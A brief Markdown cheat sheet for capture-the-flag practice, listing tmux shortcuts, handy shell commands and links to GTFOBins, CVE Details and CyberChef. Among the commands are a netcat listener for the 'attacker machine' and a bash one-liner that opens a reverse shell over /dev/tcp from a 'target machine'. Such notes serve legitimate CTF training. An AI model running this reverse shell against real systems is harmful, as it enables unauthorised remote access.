# Hello Capture The Flag (CTF)
==============================

## tmux
1. `ctrl+b :` to enter tmux command prompt
2. `$ tmux split-window vim /etc/passwd`
3. `: swap-window -s 3 -t 0`
4. `ctrl+b t`to open clock

## Nice Commands
1. `$ ls -lahR` (read permission, file size, recursively)
2. `$ wordlist` (path to wordlists)
3. `$ locate *2john` (what else john can do?)
4. `$ nc -l -p 12345` on attacker machine
5. `$ bash -c 'exec bash -i &>/dev/tcp/$RHOST/$RPORT <&1'` on target machine
6. `$ find / -type f -iname '*flag*' 2>/dev/null`
7. `$ python -m SimpleHTTPServer 8000`
8. `$ ifconfig tun0`

## Useful Links
1. [GTFOBins - Exploitable Unix binaries](https://gtfobins.github.io/)
2. [CVE Details - CVE security vulnerability database](https://www.cvedetails.com/)
3. [CyberChef - Encryption, Encoding, Compression & Data Analysis](https://gchq.github.io/CyberChef/)
